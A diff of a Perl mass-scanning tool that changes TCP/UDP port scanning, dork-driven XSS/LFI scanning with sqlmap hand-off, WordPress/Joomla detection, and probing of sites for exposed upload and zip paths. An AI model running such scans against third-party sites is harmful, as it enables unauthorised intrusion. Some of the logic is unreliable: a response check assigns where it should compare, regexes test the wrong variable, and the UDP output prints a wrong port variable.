-  if ((defined $mstart) || (defined $mend)) {
-    scandetail();
+  if (defined $muser){
+    $type3=$muser;
+  }else{
+    $type3=$_[0];
   }
-  $type3=$_[0];
+  scandetail();
+  print color 'bold';
+  print "\n[ ]............................................................................ \n";
+  print color RESET;
   forwait();
-  open (TEXT, "servers.txt");
-  while (my $Target = <TEXT>) {
-	chomp $Target;
-	print color 'bold yellow';
-	print "[!] TARGET: ";
-	print color RESET;
-	print "$Target \n";
-
-	$Target=$Target;
-	sleep(1);
-    $closed6=0;
-    while ($mstart<=$mend){
+	
+  $type3=$_[0];
+  $closed6=0;
+  while ($mstart<=$mend){
+    open (TEXT, "servers.txt");
+    while (my $Target = <TEXT>) {
+	  chomp $Target;
+	  print color 'bold magenta';
+	  print "    [!] TARGET: ";
+	  print color RESET;
+	  print "$Target\n";
+  
       $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$mstart",Proto=>"$type3") or $closed6++;
       close $socket;
+	  
+	  print color 'bold yellow';
+      print "    [+] TYPE:  ";
+      print color RESET;
+      print "$type3  ";
+
+	  print color 'bold yellow';
+      print "PORT:  ";
+      print color RESET;
+      print "$mstart  ";
+	  
+	  print color 'bold yellow';
+      print "INFO:  ";
+      print color RESET;
       if ($closed6==0){
 	    print color 'green';
-        print "[!] Open $type3 Port -> ";
-        print "$mstart\n";
-		print color RESET;
+        print "Open!\n";
+	    print color RESET;
+	  }else{
+		print color 'red';
+        print "Closed\n\n";
+        print color RESET;
       }
-      $closed6=0;
-      $mstart++;
-	}
+    }
+    $closed6=0;
+    $mstart++;
+    print "[ ]............................................................................ \n";
   }
   print "\n";
   print color 'red';
@@ -2953,44 +3083,98 @@ sub user {
 ##################################
 sub user2 {
   subuser();
-  if ((defined $mstart) || (defined $mend)) {
-    scandetail();
-  }
+  scandetail();
+  mlistname();
+  print color 'bold';
+  print "\n[ ]............................................................................ \n";
+  print color RESET;
   forwait();
 
-  open (TEXT, "servers.txt");
-  while (my $Target = <TEXT>) { ###
-	chomp $Target;
-	print color 'bold yellow';
-	print "[!] TARGET: ";
-	print color RESET;
-	print "$Target \n";
-
-	$Target=$Target;
-	sleep(1);
-    $closed7=0;
-    $closed8=0;
-    while ($mstart<=$mend){
+  $closed7=0;
+  $closed8=0;
+  while ($mstart<=$mend){
+	
+    open (TEXT, "servers.txt");
+    while (my $Target = <TEXT>) { ###
+	  chomp $Target;
+	  print color 'bold magenta';
+	  print "[!] TARGET: ";
+	  print color RESET;
+	  print "$Target \n";
+	
       $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$mstart",Proto=>"tcp") or $closed7++;
       close $socket;
       $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$mstart",Proto=>"udp") or $closed8++;
       close $socket;
+	  
       if ($closed7==0){
-	    print color 'green';
-        print "[!] Open TCP Port -> ";
-        print "$mstart\n";
+	    print color 'bold yellow';
+        print "    [+] TYPE:  ";
         print color RESET;
-      }  
+        print "tcp  ";
+	    print color 'bold yellow';
+        print "PORT:  ";
+        print color RESET;
+        print "$mstart  ";
+	    print color 'bold yellow';
+        print "INFO:  ";
+        print color RESET;
+		print color 'green';
+        print "Open!\n";
+        print color RESET;
+	  }else{
+	    print color 'bold yellow';
+        print "    [+] TYPE:  ";
+        print color RESET;
+        print "tcp  ";
+	    print color 'bold yellow';
+        print "PORT:  ";
+        print color RESET;
+        print "$mstart  ";
+	    print color 'bold yellow';
+        print "INFO:  ";
+        print color RESET;
+		print color 'red';
+        print "Closed!\n\n";
+        print color RESET;
+	  }
+	  
       if ($closed8==0){
-	    print color 'green';
-        print "[!] Open UDP Port -> ";
-        print "$mstart\n";
-	    print color RESET;
-      }
-      $closed7=0;
-      $closed8=0;
-      $mstart++;
-	}
+	    print color 'bold yellow';
+        print "    [+] TYPE:  ";
+        print color RESET;
+        print "udp  ";
+	    print color 'bold yellow';
+        print "PORT:  ";
+        print color RESET;
+        print "$port4  ";
+	    print color 'bold yellow';
+        print "INFO:  ";
+        print color RESET;
+		print color 'green';
+        print "Open!\n";
+        print color RESET;
+	  }else{
+	    print color 'bold yellow';
+        print "    [+] TYPE:  ";
+        print color RESET;
+        print "udp  ";
+	    print color 'bold yellow';
+        print "PORT:  ";
+        print color RESET;
+        print "$port4  ";
+	    print color 'bold yellow';
+        print "INFO:  ";
+        print color RESET;
+		print color 'red';
+        print "Closed!\n\n";
+        print color RESET;
+	  }
+    }
+    $closed7=0;
+    $closed8=0;
+    $mstart++;
+    print "[ ]............................................................................ \n";
   }
   print "\n";
   print color 'red';
@@ -3048,7 +3232,7 @@ sub msites {
             if($domain2 =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) {
               $site = $2;
             }
-			if ((!defined $mwpsites) && (!defined $mjoomsites)) {
+			if ((!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mzipsites) && (!defined $muploadsites)) {
 		  	  print color 'bold yellow';
 			  print "[!] TARGET: ";
 	          print color RESET;
@@ -3061,7 +3245,7 @@ sub msites {
               $request = HTTP::Request->new('GET', $URL);
               $response = $ua->request($request);
 			  print color 'bold yellow';
-			  print "[!] INFO:   ";
+			  print "[+] INFO:   ";
 	          print color RESET;
               if($response = RC_OK){
                 print "HTTP/1.1 200 OK  ";
@@ -3129,7 +3313,7 @@ sub msites {
     $lc++ while <$file>;
 	print color 'yellow';
 	
-	if ((!defined $mwpsites) && (!defined $mjoomsites)) {
+	if ((!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mzipsites) && (!defined $muploadsites)) {
 	  print "[!] $lc Unique Result(s) Found!\n";
 	  print color RESET;
 	  close $file;
@@ -3144,7 +3328,7 @@ sub msites {
 	print color RESET;
   }
 	
-  if ((defined $mjoomsites) || (defined $mwpsites) || (defined $muploadsites) || (defined $mzipsites) || (defined $madmin) || (defined $msubdomain)) {
+  if ((defined $mjoomsites) || (defined $mwpsites) || (defined $muploadsites) || (defined $msubdomain) || (defined $mzipsites) || (defined $madmin) || (defined $msubdomain)) {
   }else{
     print color 'red';
 	timer();
@@ -3182,7 +3366,7 @@ sub mwpsites {
     $request = HTTP::Request->new('GET', $URL1);
     $response = $ua->request($request);
     print color 'bold yellow';
-	print "[!] INFO:   ";
+	print "[+] INFO:   ";
     print color RESET;
     if($response = RC_OK){
       print "HTTP/1.1 200 OK  ";
@@ -3196,14 +3380,13 @@ sub mwpsites {
     my $html = $response->content;
 	
     print color 'bold yellow';
-	print "[!] VULN:   ";
+	print "[!] CMS:    ";
 	print color RESET;
 		
 	if ( $html =~ m/loginform/i || m/user_login/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i || m/user_pass/i ){
 	  print color 'green';
-      print "$site2 \n";
+      print "Wordpress! \n";
 	  print color RESET;
-	  
 	  
       open (LOG, '>>WP_server_sites_Scan.txt');
       print LOG "$site2\n";
@@ -3211,7 +3394,7 @@ sub mwpsites {
 	  
 	}else{
 	  print color 'red';
-      print "No \n";
+      print "Not Wordpress! \n";
 	  print color RESET;
 	}
     print "[ ]............................................................................ \n";
@@ -3285,7 +3468,7 @@ sub mjoomsites {
     $request = HTTP::Request->new('GET', $URL1);
     $response = $ua->request($request);
     print color 'bold yellow';
-	print "[!] INFO:   ";
+	print "[+] INFO:   ";
     print color RESET;
     if($response = RC_OK){
       print "HTTP/1.1 200 OK  ";
@@ -3299,12 +3482,12 @@ sub mjoomsites {
     my $html = $response->content;
 	
     print color 'bold yellow';
-	print "[!] VULN:   ";
+	print "[!] CMS:    ";
 	print color RESET;
 		
 	if ( $html =~ m/mod-login-password/i || m/username/i || m/passwd/i || m/submit/i ){
 	  print color 'green';
-      print "$site2 \n";
+      print "Joomla! \n";
 	  print color RESET;
 	  
       open (LOG, '>>Joom_server_sites_Scan.txt');
@@ -3313,7 +3496,7 @@ sub mjoomsites {
 	  
 	}else{
 	  print color 'red';
-      print "No \n";
+      print "Not Joomla! \n";
 	  print color RESET;
 	}
     print "[ ]............................................................................ \n";
@@ -3361,6 +3544,7 @@ sub mjoomsites {
 ###################################################################		
 sub muploadsites {
   submsites();
+  UPLOAD();
   infocounservertargets();
 
   $listcheck = "Upload_server_files_Scan.txt";
@@ -3387,7 +3571,7 @@ sub muploadsites {
     $request = HTTP::Request->new('GET', $URL1);
     $response = $ua->request($request);
     print color 'bold yellow';
-	print "[!] INFO:   ";
+	print "[+] INFO:   ";
     print color RESET;
     if($response = RC_OK){
       print "HTTP/1.1 200 OK  ";
@@ -3395,13 +3579,18 @@ sub muploadsites {
     }  
 
     foreach $UPLOAD(@UPLOAD){
+      print color 'bold yellow';
+	  print "  [+] EXPL:   ";
+	  print color RESET;
+	  print "$UPLOAD\n";
+
       my $URL = $site2.$UPLOAD;
       $request = HTTP::Request->new('GET', $URL);
       $response = $ua->request($request);
       my $html = $response->content;
 	
       print color 'bold yellow';
-	  print "[!] VULN:   ";
+	  print "  [+] VULN:   ";
 	  print color RESET;
 		
 	  if ( $response->is_success ) {
@@ -3414,7 +3603,7 @@ sub muploadsites {
 	    close (LOG);
 	  }else{
 	    print color 'red';
-        print "No \n";
+        print "No Upload files! \n";
 	    print color RESET;
 	  }
       print "[ ]............................................................................ \n";
@@ -3462,7 +3651,7 @@ sub muploadsites {
 
 ###################################################################		
 sub mzipsites {
-  submsites();
+  ZIP();
   infocounservertargets();
 
   $listcheck = "Zip_server_files_Scan.txt";
@@ -3483,32 +3672,36 @@ sub mzipsites {
 	print color 'bold yellow';
 	print "[!] TARGET: ";
 	print color RESET;
-    print "$site2 \n";
-			
+    print "$site2\n";
+
     my $URL1 = $site2;
     $request = HTTP::Request->new('GET', $URL1);
     $response = $ua->request($request);
     print color 'bold yellow';
-	print "[!] INFO:   ";
+	print "[+] INFO:   ";
     print color RESET;
     if($response = RC_OK){
       print "HTTP/1.1 200 OK  ";
       print "\n";
     }  
-
     foreach $ZIP(@ZIP){
+      print color 'bold yellow';
+	  print "  [+] EXPL:   ";
+	  print color RESET;
+	  print "$ZIP\n";
+	
       my $URL = $site2.$ZIP;
       $request = HTTP::Request->new('GET', $URL);
       $response = $ua->request($request);
       my $html = $response->content;
-	
+
       print color 'bold yellow';
-	  print "[!] VULN:   ";
+	  print "  [+] VULN:   ";
 	  print color RESET;
-		
-	  if ( $response->is_success ) {
+
+	  if ($response->is_success ) {
 	    print color 'green';
-        print "$URL \n";
+        print "$URL\n";
 	    print color RESET;
 	  
         open (LOG, '>>Zip_server_files_Scan.txt');
@@ -3516,11 +3709,11 @@ sub mzipsites {
 	    close (LOG);
 	  }else{
 	    print color 'red';
-        print "No \n";
+        print "No zip files! \n";
 	    print color RESET;
 	  }
-      print "[ ]............................................................................ \n";
 	}
+   print "[ ]............................................................................ \n";
   }
   
   $list = "Zip_server_files_Scan.txt";
@@ -3553,7 +3746,7 @@ sub mzipsites {
 	print color RESET;
   }else{ 
     print color 'red';
-    print "[!] No Upload files Found!\n";
+    print "[!] No Zip files Found!\n";
 	print color RESET;
   }
   print color 'red';
@@ -3599,7 +3792,7 @@ sub mcommand {
     submsearch();
     $listname="Search_Scan.txt";
     infocountargets();
-	scandetail();
+	osinfo();
     forwait();
     open (TEXT, $listname);
     while (my $Target = <TEXT>) { 
@@ -3789,10 +3982,6 @@ if (defined $proxy) {
   $ua->cookie_jar({});
 }
 
-if ( (defined $dork) || (defined $Target) || (defined $mtarget) || (defined $mxss) || (defined $mlfi) || (defined $proxy)) {
-  testconection();
-}
-
 if (defined $help) {help(); exit();}
 
 if ((defined $dork) && (defined $exploit)) {
@@ -3813,41 +4002,46 @@ if (defined $dork) {
   }
 }
 
-if (defined $dork){
-  if (defined $mxss) {
-    if ((!defined $exploit) && ((defined $misup) || (defined $validation_text))) {
+if (defined $dork) {
+  if ((defined $mxss) || (defined $mlfi)) {
+    if ((defined $exploit) || (defined $misup) || (defined $validation_text)) {
       print color 'yellow';
-      print "[!] You can not validate without exploit ! [Ex: --exp <exploit>]\n";
+      print "[!] Xss and Lfi scan does not require exploit or validation!\n";
       print color 'RESET';
 	  exit();
     }
-    submsearch();
+  }
+}
+
+if (defined $dork){
+  submsearch();
+  if (defined $madmin) {
+    mladmin(); exit();
+  }
+  if (defined $msubdomain) {
+    mlsubdomain(); exit();
+  }
+  if ((defined $misup) && (defined $exploit)) {
+    mlisup(); exit();
+  }
+  if (defined $validation_text) {
+    mlvalidation(); exit();
+  }
+  if (defined $mxss) {
     if (defined $sqlmap) {
       if (defined $proxy) {
-        if ((!defined $exploit) && (!defined $validation_text)) { mLXss(); sqlmaptor(); exit();}
-        if ((defined $exploit) && (!defined $validation_text)) { mLexplXss(); sqlmaptor(); exit();}
-        if ((defined $exploit) && (defined $validation_text)) { mLexplVaXss(); sqlmaptor(); exit();}
+	    mLXss(); sqlmaptor(); exit();
 	  }else{
-        if ((!defined $exploit) && (!defined $validation_text)) { mLXss(); sqlmap(); exit();}
-        if ((defined $exploit) && (!defined $validation_text)) { mLexplXss(); sqlmap(); exit();}
-        if ((defined $exploit) && (defined $validation_text)) { mLexplVaXss(); sqlmap(); exit();}
+	    mLXss(); sqlmap(); exit();
 	  }
     }else{
-      if ((!defined $exploit) && (!defined $validation_text)) { mLXss(); exit();}
-      if ((defined $exploit) && (!defined $validation_text)) { mLexplXss(); exit();}
-      if ((defined $exploit) && (defined $validation_text)) { mLexplVaXss(); exit();}
-    }
+      mLXss(); exit();
+	}
   }
+  
   if (defined $mlfi) {
-      submsearch();
-      if (!defined $validation_text) { mlistLfi(); exit();}
-      if (defined $validation_text) { mlistLfi(); mlvalidation(); exit();}
-      if (defined $misup) { mlistLfi();mlisup; exit();}
+    mlistLfi(); exit();
   }
-  if ((defined $misup) && (defined $replaceme)) {submsearch(); mlisup(); exit(); }
-  if ((defined $misup) && (defined $exploit)) {submsearch(); mlisup(); exit(); }
-  if ((defined $validation_text) && (defined $exploit)) { submsearch(); mlvalidation(); exit(); }
-  if (defined $validation_text) { submsearch(); mlvalidation(); exit(); }
   
   if ((defined $command) && (defined $dork)){
     if (!defined $mtarget) {
@@ -3869,53 +4063,46 @@ if ((defined $command) && ((!defined $dork) && (!defined $mtarget))){
   mcommandfin(); exit();
 }
 
-if (defined $mxss) {
+if ((defined $mxss) && (!defined $dork)) {
   if ((!defined $listname) && (!defined $Target)){
     print color 'yellow';
     print "[!] You have to set Target/list! [Ex: -l list.txt/ -t target]\n";
+    print color 'RESET';
+	exit();
+  }
+  if ((defined $validation_text) || (defined $misup) || (defined $exploit)){
+    print color 'yellow';
+    print "[!] Xss and Lfi scan does not require exploit or validation!\n";
     print color 'RESET';
 	exit();
   }  
   if (defined $listname) {
     if (defined $sqlmap) {
       if (defined $proxy) {
-        if ((!defined $exploit) && (!defined $validation_text)) { mLXss(); sqlmaptor(); exit();}
-        if ((defined $exploit) && (!defined $validation_text)) { mLexplXss(); sqlmaptor(); exit();}
-        if ((defined $exploit) && (defined $validation_text)) { mLexplVaXss(); sqlmaptor(); exit();}
-
-	  }else{
-        if ((!defined $exploit) && (!defined $validation_text)) { mLXss(); sqlmap(); exit();}
-        if ((defined $exploit) && (!defined $validation_text)) { mLexplXss(); sqlmap(); exit();}
-        if ((defined $exploit) && (defined $validation_text)) { mLexplVaXss(); sqlmap(); exit();}
+        mLXss(); sqlmaptor(); exit();
+      }else{
+        mLXss(); sqlmap(); exit();
 	  }
 	}else{
-      if ((!defined $exploit) && (!defined $validation_text)) { mLXss(); exit();}
-      if ((defined $exploit) && (!defined $validation_text)) { mLexplXss(); exit();}
-      if ((defined $exploit) && (defined $validation_text)) { mLexplVaXss(); exit();}
+      mLXss();exit();
 	}
   }
   
   if (defined $Target) {
+    if ($Target =~ m/.txt/i || m/.log/i) {  
+      print color 'yellow';
+      print "[!] You have to set Target/list! [Ex: -l list.txt/ -t target]\n";
+      print color 'RESET';
+	  exit();
+    }
     if (defined $sqlmap) {
-      if ((!defined $exploit) && (!defined $validation_text)) {
-        print color 'yellow';
-        print "[!] You have to set Vlidation! [Ex: --valid <TXT>/ --isup]\n";
-        print color 'RESET';
-	    exit();
-	  }
-       if (defined $proxy) {
-        if ((!defined $exploit) && (!defined $validation_text)) { mtXss(); sqlmaptor(); exit();}
-        if ((defined $exploit) && (!defined $validation_text)) { mtexplXss(); sqlmaptor(); exit();}
-        if ((defined $exploit) && (defined $validation_text)) { mtexplVaXss(); sqlmaptor(); exit(); }
+      if (defined $proxy) {
+        mtXss(); sqlmaptor(); exit();
 	  }else{
-        if ((!defined $exploit) && (!defined $validation_text)) { mtXss(); sqlmap(); exit();}
-        if ((defined $exploit) && (!defined $validation_text)) { mtexplXss(); sqlmap(); exit();}
-        if ((defined $exploit) && (defined $validation_text)) { mtexplVaXss(); sqlmap(); exit(); }
+        mtXss(); sqlmap(); exit();
 	  }
 	}else{
-      if ((!defined $exploit) && (!defined $validation_text)) { mtXss(); exit();}
-      if ((defined $exploit) && (!defined $validation_text)) { mtexplXss(); exit();}
-      if ((defined $exploit) && (defined $validation_text)) { mtexplVaXss(); exit(); }
+      mtXss();exit();
 	}
   }
 }  
@@ -3928,7 +4115,15 @@ if (defined $mlfi) {
 	exit();
   }
   if (defined $listname) { mlistLfi(); exit(); }
-  if (defined $Target) { mtLfi(); exit(); }
+  if (defined $Target) {
+    if ($Target =~ m/.txt/i || m/.log/i) {  
+      print color 'yellow';
+      print "[!] You have to set Target/list! [Ex: -l list.txt/ -t target]\n";
+      print color 'RESET';
+	  exit();
+    }
+    mtLfi(); exit();
+  }
 }
 
 if (defined $mjoomrfi) {
@@ -3953,7 +4148,7 @@ if (defined $mwpadf) {
   if (defined $Target){ mtwprfi(); exit(); }
 }
 
-if (defined $madmin) {
+if ((defined $madmin) && (!defined $dork)) {
   if ((!defined $listname) && (!defined $Target)) {
     print color 'yellow';
     print "[!] You have to set Target/list! [Ex: -l list.txt/-t target]\n";
@@ -3964,7 +4159,7 @@ if (defined $madmin) {
   if (defined $Target){ mtadmin(); exit(); }
 }
 
-if (defined $msubdomain) {
+if ((defined $msubdomain) && (!defined $dork)) {
   if ((!defined $listname) && (!defined $Target)) {
     print color 'yellow';
     print "[!] You have to set Target/list! [Ex: -l list.txt/-t target]\n";
@@ -3975,16 +4170,39 @@ if (defined $msubdomain) {
   if (defined $Target){ mtsubdomain(); exit(); }
 }
 
-if (defined $mip) {
-  if (!defined $host) {
+if (defined $misup) {
+  if ((defined $dork) || (defined $listname) || (defined $Target)) {
+    if (!defined $exploit) {
+      print color 'yellow';
+      print "[!] You have to exploit to validate! [Ex: --exp <exploit>]\n";
+      print color 'RESET';
+	  exit();
+	}
+  }
+  if ((!defined $dork) && (!defined $listname) && (!defined $Target)) {
     print color 'yellow';
-    print "[!] You have to set a server ip! [Ex: -h 16.12.01.82]\n";
+    print "[!] Set a taget! [Ex: -t <target>/ -l <targets.txt>] OR make search\n";
     print color 'RESET';
 	exit();
   }
-  if (defined $host) { mlsubdomain(); exit(); }
-  if (defined $Target){ mtsubdomain(); exit(); }
 }
+if (defined $validation_text) {
+  if ((defined $dork) || (defined $listname) || (defined $Target)) {
+    if (!defined $exploit) {
+      print color 'yellow';
+      print "[!] You have to exploit to validate! [Ex: --exp <exploit>]\n";
+      print color 'RESET';
+	  exit();
+	}
+  }
+  if ((!defined $dork) && (!defined $listname) && (!defined $Target)) {
+    print color 'yellow';
+    print "[!] Set a taget! [Ex: -t <target>/ -l <targets.txt>] OR make search\n";
+    print color 'RESET';
+	exit();
+  }
+}
+
 
 if (defined $mports) {
   if (!defined $Target) {
@@ -4002,14 +4220,6 @@ if (defined $mports) {
 	}
   }
   if (defined $Target) {
-    if ((defined $mbasic) || (defined $mall) || (defined $muser)) {
-	  if ((!defined $mtcp) && (!defined $mudp)) {
-        print color 'yellow';
-        print "[!] Set a ports type! [Ex: --tcp / --udp / --tcp --udp ]\n";
-        print color 'RESET';
-	    exit();
-	  }
-	}
     if ((!defined $mbasic) && (!defined $mall)) {
 	  if ((defined $mstart) && (defined $mend) && (!defined $muser)){
         print color 'yellow';
@@ -4026,17 +4236,17 @@ if (defined $mports) {
 	    exit();
 	  }	
 	}  
-	  
+	 
     if (defined $mbasic) {
-      if (defined $mtcp) { basic('tcp'); exit(); }
-      if (defined $mudp) { basic('udp'); exit(); }
-      if ((defined $mtcp) && (defined $mudp)) { basic2(); exit(); }
+      if ($mbasic eq "tcp") { basic('tcp'); exit(); }
+      if ($mbasic eq "udp") { basic('udp'); exit(); }
+      if ($mbasic eq "udp+tcp") { basic2(); exit(); }
 	}
 	
     if (defined $mall) {
-      if (defined $mtcp) { complete('tcp'); exit(); }
-      if (defined $mudp) { complete('udp'); exit(); }
-      if ((defined $mtcp) && (defined $mudp)) { complete2(); exit(); }
+      if ($mall eq "tcp") { complete('tcp'); exit(); }
+      if ($mall eq "udp") { complete('udp'); exit(); }
+      if ($mall eq "udp+tcp") { complete2(); exit(); }
 	}
 
     if (defined $muser) {
@@ -4045,10 +4255,11 @@ if (defined $mports) {
         print "[!] Set a port range! [Ex: --start 21 --end 81]\n";
         print color 'RESET';
 	    exit();
+	  }else{
+        if ($muser eq "tcp") { user('tcp'); exit(); }
+        if ($muser eq "udp") { user('udp'); exit(); }
+        if ($muser eq "udp+tcp") { user2(); exit(); }
 	  }
-      if (defined $mtcp) { user('tcp'); exit(); }
-      if (defined $mudp) { user('udp'); exit(); }
-      if ((defined $mtcp) && (defined $mudp)) { user2(); exit(); }
 	}	
   }else{
     print color 'yellow';
@@ -4056,6 +4267,25 @@ if (defined $mports) {
     print color 'RESET';
 	exit();
   }
+}
+
+if ((defined $mbasic) && (($mbasic eq "udp") || ($mbasic eq "tcp") || ($mbasic eq "udp+tcp"))) {}else{
+  print color 'yellow';
+  print "\n Use port type! [EX: --basic tcp/udp/udp+tcp --all tcp/udp/udp+tcp --select tcp/udp/udp+tcp]\n";
+  print color RESET;
+  exit();
+}
+if ((defined $mall) && (($mall eq "udp") || ($mall eq "tcp") || ($mall eq "udp+tcp"))) {}else{
+  print color 'yellow';
+  print "\n Use port type! [EX: --all tcp/udp/udp+tcp --all tcp/udp/udp+tcp --select tcp/udp/udp+tcp]\n";
+  print color RESET;
+  exit();
+}
+if ((defined $muser) && (($muser eq "udp") || ($muser eq "tcp") || ($muser eq "udp+tcp"))) {}else{
+  print color 'yellow';
+  print "\n Use port type! [EX: --select tcp/udp/udp+tcp --all tcp/udp/udp+tcp --select tcp/udp/udp+tcp]\n";
+  print color RESET;
+  exit();
 }
 
 if (defined $msites) {
@@ -4155,6 +4385,10 @@ if (defined $muplodsites) {
 }
 
 if (defined $mzipsites) {
+  submsites(); mzipsites(); exit();
+}
+
+if (defined $mzipsites) {
   if (!defined $Target) {
     print color 'yellow';
     print "[!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
@@ -4171,12 +4405,10 @@ if (defined $mzipsites) {
   }
   if (!defined $mlevel) {
     print color 'yellow';
-
-    print "[!] You have to set scan level (when scan must stop) [Ex: --level 50]\n";
+    print "[!] You have to set scan level! [Ex: --level 50]\n";
     print color 'RESET';
 	exit();
   }
-  mzipsites(); exit();
 }
 
 if (defined $mmd5) {
@@ -4216,7 +4448,7 @@ if (defined $mhttpd) {
     print color 'RESET';
 	exit();
   }
-  scandetail();
+  osinfo();
   mhttpd();exit();
 }
 
@@ -4442,17 +4674,13 @@ if($task eq "2"){
   #XSS SCAN
   if ($ID==2){
     sleep (1);
-    ###########################
-    ####### BGN CHECK USE LIST
-    ###########################
+
     USELIST:;
     print color 'yellow';
     print "[+] Do You Want To Scan a List? (Y/n): ";
     print color RESET;
     $uselist=<STDIN>;
     chomp ($uselist);
-    ####### END CHECK USE LIST
-	####### BGN LIST NAME
 	if ($uselist =~ /^[Y]?$/i) {
 	  LISTNAME:;
       print color 'yellow';
@@ -4465,7 +4693,7 @@ if($task eq "2"){
 	    print "[+] Uppss.. you have to Enter List Name!\n";
         print color RESET;
 	    goto LISTNAME;
-      };
+      }
 	  
       $listcheck = $listname;
       if (!-e $listcheck){
@@ -4475,142 +4703,26 @@ if($task eq "2"){
 	    print color RESET;
 		goto LISTNAME;
 	  }
-
-      #####
-	  USEXPLOIT:;
-      print color 'yellow';
-      print "[+] Do You Want To Use an Exploit? (Y/n): ";
-      print color RESET;
-      $usexploit=<STDIN>;
-      chomp ($usexploit);
-	  
-	  if ($usexploit =~ /^[Y]?$/i) {
-	    id221:;
-
-        print color 'yellow';
-        print "[+] Enter Exploit: ";
-        print color RESET;
-        $exploit=<STDIN>;
-        chomp ($exploit);
-	    if (!$exploit){ 
-          print color 'red';
-	      print "[+] Uppss.. you have to Enter your Exploit!\n";
-          print color RESET;
-	      goto id221;
-        };
-	  
-        VALIDATE:;
-        print color 'yellow';
-        print "[+] Do You Want To Validate Results? (Y/n): ";
-        print color RESET;
-        $validate=<STDIN>;
-	    if ($validate =~ /^[Y]?$/i) {
-	      id2221:;
-          print color 'yellow';
-          print "[+] Enter Text to Validate: ";
-          print color RESET;
-          $validation_text=<STDIN>;
-          chomp ($validation_text);
-		  if (!$validation_text){ 
-            print color 'red';
-	        print "[+] Uppss.. you have to Enter your Text to Validate!\n";
-            print color RESET;
-	        goto id2221;
-          };
-		testconection();  
-        mLexplVaXss();
-	  }else{ ### THEN NO VALIDATION
-	    testconection();
-        mLexplXss();
-	  }  ### END NO VALIDATION
-    }else{ ### THEN NO EXPLOIT
-	    testconection();
-        mLXss();
-      } ### END NO EXPLOIT
+      mLXss();
     }else{ ####### IF NO USE LIST
-	  USEXPLOIT:;
+      id2:;
       print color 'yellow';
-      print "[+] Do You Want To Use an Exploit? (Y/n): ";
+      print "[+] Please Enter Target [http://www.site.com/search.php?id=12] \n";
+      print "[+] Target: ";
       print color RESET;
-      $usexploit=<STDIN>;
-      chomp ($usexploit);
-	  
-	    if ($usexploit =~ /^[Y]?$/i) {
-	    id221:;
-        print color 'yellow';
-        print "[+] Enter Exploit: ";
+      $Target=<STDIN>;
+      chomp ($Target);
+      if (!$Target){ 
+        print color 'red';
+	    print "[+] Uppss.. you have to set a Target!\n";
         print color RESET;
-        $exploit=<STDIN>;
-        chomp ($exploit);
-	    if (!$exploit){ 
-          print color 'red';
-	      print "[+] Uppss.. you have to Enter your Exploit!\n";
-          print color RESET;
-	      goto id221;
-        };
-
-        id21:;
-        print color 'yellow';
-        print "\n    [+] Please Enter Target [http://www.site.com] ";
-        print "\n    [+] Target: ";
-        print color RESET;
-        $Target=<STDIN>;
-        chomp ($Target);
-        if (!$Target){ 
-          print color 'red';
-	      print "[+] Uppss.. you have to set a Target!\n";
-          print color RESET;
-	      goto id21;
-        };
-        if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-	  
-        VALIDATE:;
-        print color 'yellow';
-        print "[+] Do You Want To Validate Results? (Y/n): ";
-        print color RESET;
-        $validate=<STDIN>;
-		
-	    if ($validate =~ /^[Y]?$/i) {
-	      id2221:;
-          print color 'yellow';
-          print "[+] Enter Text to Validate: ";
-          print color RESET;
-          $validation_text=<STDIN>;
-          chomp ($validation_text);
-   		  if (!$validation_text){ 
-            print color 'red';
-	        print "[+] Uppss.. you have to Enter your Text to Validate!\n";
-            print color RESET;
-	        goto id2221;
-          };
-		  testconection();
-          mtexplVaXss();  
-	    }else{ ### THEN NO VALIDATION
-		  testconection();
-          mexplXss(); 
- 	    }  ### END VALIDATION
-      }else{ ### THEN NO EXPLOIT
-        id2:;
-        print color 'yellow';
-        print "[+] Please Enter Target [http://www.site.com/search.php?id=12] \n";
-        print "[+] Target: ";
-        print color RESET;
-        $Target=<STDIN>;
-        chomp ($Target);
-        if (!$Target){ 
-          print color 'red';
-	      print "[+] Uppss.. you have to set a Target!\n";
-          print color RESET;
-	      goto id2;
-        };
+	    goto id2;
+      }
+      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+      mtXss();
+    }
+	finxss();
   
-        if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-		testconection();
-        mtXss();
-      } ### END NO EXPLOIT
-    } ####### END NO USE LIST
-    ####### END SCAN
-    finxss();
 	##########################
     ## Add sqlmap option
     $list = "XSS_Site_Scan.txt";
@@ -5198,15 +5310,15 @@ if($task eq "3"){
     chomp($menu);
 	
 ####################################
-    if ($menu==1) {testconection();basic('tcp');}
-    if ($menu==2) {testconection();basic('udp');}
-    if ($menu==3) {testconection();basic2();}
-    if ($menu==4) {testconection();complete('tcp');}
-    if ($menu==5) {testconection();complete('udp');}
-    if ($menu==6) {testconection();complete2();}
-    if ($menu==7) {testconection();user('tcp');}
-    if ($menu==8) {testconection();user('udp');}
-    if ($menu==9) {testconection();user2();}
+    if ($menu==1) {basic('tcp');}
+    if ($menu==2) {basic('udp');}
+    if ($menu==3) {basic2();}
+    if ($menu==4) {complete('tcp');}
+    if ($menu==5) {complete('udp');}
+    if ($menu==6) {complete2();}
+    if ($menu==7) {user('tcp');}
+    if ($menu==8) {user('udp');}
+    if ($menu==9) {user2();}
 	finports();
     if ($menu==10) {goto IDS;}
     if ($menu==11) {
